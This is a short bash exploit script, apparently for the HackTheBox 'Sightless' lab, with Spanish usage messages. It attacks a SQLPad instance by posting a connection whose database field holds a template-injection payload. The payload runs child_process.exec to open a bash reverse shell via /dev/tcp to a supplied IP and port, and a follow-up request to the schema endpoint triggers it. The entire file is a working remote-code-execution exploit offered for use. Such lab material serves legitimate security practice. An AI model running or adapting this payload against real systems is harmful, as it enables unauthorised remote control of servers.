#!/bin/bash

#Remember to put the Netcat on the listening port

IP="${1}"
PORT="${2}"

if [[ -z "${@}" ]]; then
    echo "Añade la IP y el Puerto"
    echo "Ejemplo: ./exploit.sh IP PORT"
    exit 1
fi

payload=$(cat <<EOF
{
  "name": "worm",
  "driver": "mysql",
  "data": {
    "database": "{{ process.mainModule.require('child_process').exec('/bin/bash -c \"bash -i >& /dev/tcp/${IP}/${PORT} 0>&1\"') }}"
  }
}
EOF
)

response=$(curl -s -X POST 'http://sqlpad.sightless.htb/api/connections' \
-H 'Content-Type: application/json' \
-d "$payload")

id=$(echo "$response" | jq -r '.id')

curl -s "http://sqlpad.sightless.htb/api/connections/${id}/schema" &>/dev/null 
